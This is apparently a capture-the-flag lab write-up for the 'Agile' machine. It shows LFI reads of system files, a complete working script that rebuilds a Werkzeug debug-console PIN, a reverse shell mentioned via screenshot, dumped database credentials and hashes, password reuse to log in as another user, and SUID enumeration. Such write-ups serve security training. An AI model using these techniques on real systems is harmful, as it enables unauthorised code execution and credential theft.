# Agile

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sC -sV -T4 10.10.11.203    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-08 11:32 EST
Nmap scan report for 10.10.11.203
Host is up (0.069s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We see a login page, but default credentials don't work

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F0M1ZzLLJQ6438GMFhWvc%2Fimage.png?alt=media&#x26;token=b821e720-37cd-4148-9a18-d44fdd3851e8" alt=""><figcaption></figcaption></figure>

We register and access the password vault. We can then put passwords.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F2xlsN0RnM5zxSB2FYTms%2Fimage.png?alt=media&#x26;token=4ece225f-5c51-4d13-9ddb-36e5552a7ca1" alt=""><figcaption></figcaption></figure>

When we click on export, we capture the request with burp. We see that we are redirected

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fd5uHF4qBwSb0H0gHyyt8%2Fimage.png?alt=media&#x26;token=a6fb477c-7f49-4495-ab38-c10d3efa5b92" alt=""><figcaption></figcaption></figure>

We are redirected with the following request

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fl4ohlHyz9pkwYDLZMdfV%2Fimage.png?alt=media&#x26;token=c1fb3e40-166c-4982-92a3-530a22e00b10" alt=""><figcaption></figcaption></figure>

We can try for LFI

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FYpahKd0AyCb2qE8v3NN3%2Fimage.png?alt=media&#x26;token=edd67300-eed1-499c-9cbf-03065d391647" alt=""><figcaption></figcaption></figure>

When an error occurs on the app we get the following debugging page. We know it's a python website

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fwq0784I8M4g2ZU9Asx6R%2Fimage.png?alt=media&#x26;token=1a317bf8-9f99-4398-b3a4-466fa5ef33e5" alt=""><figcaption></figcaption></figure>

On the right end of each line there is a link to the console (Werkzeug) but it needs a pin to be accessible

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FaKOt1x1mSWRxw51Qovot%2Fimage.png?alt=media&#x26;token=fad4e6d1-5b97-4dc1-892f-c8126b9577a6" alt=""><figcaption></figcaption></figure>

We can try to use the LFI to get the information we need to crack the pin. We need :

* The MAC address of the computer in decimal format
* The machine id
* The username of who started the flask app ⇒ can be found in the error logs
* The modname of the Flask.app\[it is always `flask.app` ]
* The `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` is ‘_Flask_’
* The `getattr(mod, '__file__', None)` is the absolute path `app.py` in the flask directory. \[it can be figured out from the error logs as well]

To get the MAC address, first we need the name of the device , which can be found in `/proc/net/arp`.

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FoIFq2pNLdoLaIFUMcP53%2Fimage.png?alt=media&#x26;token=88f57994-aed8-425f-a2ee-d30f98699cae" alt=""><figcaption></figcaption></figure>

We can use that device id to get the MAC address in `/sys/class/net/<DEVICE_ID>/address`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fa1yZH23Vl0Y7C8l7FgiP%2Fimage.png?alt=media&#x26;token=e55eda4c-020c-4267-a8fa-a29042d9a2a6" alt=""><figcaption></figcaption></figure>

We need the decimal value of the MAC address. We can use python to make the translation

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3                  
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print(0x005056b0470c)
345051776780
```

Next we need the machine id. It is composed of 2 parts. The 1st one can be found in `/etc/machine-id`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FXoKBH5kiSWhwDKP7TCNt%2Fimage.png?alt=media&#x26;token=a44b03a3-d090-4676-a451-dcd42647e8bf" alt=""><figcaption></figcaption></figure>

The second part we need to append is located in `/proc/self/cgroup`. We need to take the last part after the last /

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fs6pXCydXEuI03yl1MNek%2Fimage.png?alt=media&#x26;token=4f18e04e-3609-45eb-a337-f0a884371549" alt=""><figcaption></figcaption></figure>

Provoking an error by including a non existent file, we are able to find the absolute path to `app.py`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FbpmKhrBbGTxEdoCVAzwY%2Fimage.png?alt=media&#x26;token=b2b0de85-af98-410a-b97f-7a258185c556" alt=""><figcaption></figcaption></figure>

I couldn't find the user in the error logs, so I grabbed `/proc/self/environ` and we figure out it's `www-data`

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FS3QkMO5eDuq6mq5AODEx%2Fimage.png?alt=media&#x26;token=e96d9b19-3f7c-4cde-a057-4d2eb1395283" alt=""><figcaption></figcaption></figure>

We find a script to generate the pin from all those informations, but the pin is invalid. We must have an error

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 debug_pin.py
329-006-255
```

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FQPOsDNeeRAKMaoG9kO6m%2Fimage.png?alt=media&#x26;token=47a1b702-422a-4e1d-9cbf-181cce4caccc" alt=""><figcaption></figcaption></figure>

The error must be coming from those 2 parameters, as we checked the other ones :

* The modname of the Flask.app\[it is always `flask.app` ]
* The `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` is ‘_Flask_’

We end up finding the following table. We can try those combinations

```shellscript
Module Name      Application Name
-------------------------------------
flask.app      - wsgi_app
werkzeug.debug - DebuggedApplication
flask.app      - Flask
```

The correct informations ended up being the following

```python
#!/bin/python3
import hashlib
from itertools import chain

probably_public_bits = [
        'www-data',# username
        'flask.app',# modname
        'wsgi_app',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
        '/app/venv/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
        '345051776780',# str(uuid.getnode()),  /sys/class/net/ens33/address 
        # Machine Id: /etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup
        'ed5b159560f54721827644bc9b220d00superpass.service'
]

h = hashlib.sha1() # Newer versions of Werkzeug use SHA1 instead of MD5
for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
                bit = bit.encode('utf-8')
        h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
        for group_size in 5, 4, 3:
                if len(num) % group_size == 0:
                        rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                                                  for x in range(0, len(num), group_size))
                        break
        else:
                rv = num

print("Pin: " + rv)
```

With the above script, we generate the pin

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 debug_pin.py
Pin: 801-040-078
```

We can now access the console and execute commands

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FsbNtj3XF8PaSnLBTHRaM%2Fimage.png?alt=media&#x26;token=f52feef7-839e-4830-bc6e-49fc9e2bae2f" alt=""><figcaption></figcaption></figure>

We put a reverse shell payload

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Fd4shSKzfQPRhEzxZgBpm%2Fimage.png?alt=media&#x26;token=c42598ea-a854-4d61-b21f-de1762984ef3" alt=""><figcaption></figcaption></figure>

We find some credentials for mysql

```shellscript
(venv) www-data@agile:/app$ ls -la 
total 36
drwxr-xr-x  6 root      root      4096 Mar  8  2023 .
drwxr-xr-x 20 root      root      4096 Feb 20  2023 ..
drwxr-xr-x  3 root      root      4096 Jan 23  2023 .pytest_cache
drwxr-xr-x  5 corum     runner    4096 Feb  8  2023 app
drwxr-xr-x  9 runner    runner    4096 Feb  8  2023 app-testing
-r--r-----  1 dev_admin www-data    88 Jan 25  2023 config_prod.json
-r--r-----  1 dev_admin runner      99 Jan 25  2023 config_test.json
-rwxr-xr-x  1 root      runner     557 Dec  8 21:39 test_and_update.sh
drwxrwxr-x  5 root      dev_admin 4096 Feb  8  2023 venv
(venv) www-data@agile:/app$ cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```

We find the following informations

```shellscript
mysql> select * from users;
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
| id | username | hashed_password                                                                                                          |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
|  1 | 0xdf     | $6$rounds=200000$FRtvqJFfrU7DSyT7$8eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF. |
|  2 | corum    | $6$rounds=200000$yRvGjY1MIzQelmMX$9273p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1 |
|  9 | test     | $6$rounds=200000$/O1WPCDmlf3dDa5o$wvyHVUIoeybhFNUfuFoSoBCsIdnBbrZwZpKF/oF3pr..717Oym/VB/XbWjwBbWYDY3Lh6VKbYiYZZR.U0.srm. |
| 10 | er       | $6$rounds=200000$ONmdw/1ZQqoS8GMO$Pkda0k5TseZoal11G.pbG6gF68sS7HnH0/QpT1k/0NeaxPBwM.hQUSntK/aQIkaRYumBWYKHvy8HBNbaAoAoN. |
+----+----------+--------------------------------------------------------------------------------------------------------------------------+
4 rows in set (0.00 sec)

mysql> select * from passwords;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
```

We want to get a list of users on the machine

```shellscript
(venv) www-data@agile:/app$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
corum:x:1000:1000:corum:/home/corum:/bin/bash
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
```

We can reuse the password for corum

```shellscript
corum:5db7caa1d13cc37c9fc2

corum@agile:/app$ id 
uid=1000(corum) gid=1000(corum) groups=1000(corum)
```

We find an SUID binary : chrome-sandbox

```shellscript
corum@agile:/opt/google/chrome$ find / -type f -perm -04000 -ls 2>/dev/null
     5223     20 -rwsr-xr-x   1 root     root        18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
      926     36 -rwsr-xr-x   1 root     root        35192 Feb 21  2022 /usr/bin/umount
      632     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
      582     72 -rwsr-xr-x   1 root     root        72712 Nov 24  2022 /usr/bin/chfn
     5678     60 -rwsr-xr-x   1 root     root        59976 Nov 24  2022 /usr/bin/passwd
     5677     72 -rwsr-xr-x   1 root     root        72072 Nov 24  2022 /usr/bin/gpasswd
      639     44 -rwsr-xr-x   1 root     root        44808 Nov 24  2022 /usr/bin/chsh
      523     36 -rwsr-xr-x   1 root     root        35200 Mar 23  2022 /usr/bin/fusermount3
      869     56 -rwsr-xr-x   1 root     root        55672 Feb 21  2022 /usr/bin/su
     5673     40 -rwsr-xr-x   1 root     root        40496 Nov 24  2022 /usr/bin/newgrp
      409    228 -rwsr-xr-x   1 root     root       232416 Aug  4  2022 /usr/bin/sudo
     7185     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1210    332 -rwsr-xr-x   1 root     root         338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
     3068    136 -rwsr-xr-x   1 root     root         138408 Dec  1  2022 /usr/lib/snapd/snap-confine
    79065    216 -rwsr-xr-x   1 root     root         219584 Dec  1  2022 /opt/google/chrome/chrome-sandbox
```

After looking online, it does not appear to be vulnerable
